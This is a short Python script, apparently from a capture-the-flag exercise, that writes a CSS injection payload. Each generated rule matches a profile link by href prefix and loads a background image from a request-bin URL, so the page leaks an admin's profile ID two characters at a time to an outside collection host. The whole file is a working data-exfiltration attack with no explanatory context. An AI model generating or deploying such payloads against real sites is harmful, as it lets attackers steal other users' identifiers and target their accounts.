url = "https://xxxxxxxxxxxxx.x.pipedream.net"
admin_id = ""

with open("example.css", mode="w") as f:
    for i in "abcdefghijklmnopqrstuvwxyz0123456789-_":
        for j in "abcdefghijklmnopqrstuvwxyz0123456789-_":
            f.write(f"a[href^='/profile/{admin_id}{i}{j}'] {{background-image: url('{url}/?{admin_id}{i}{j}');}}\n")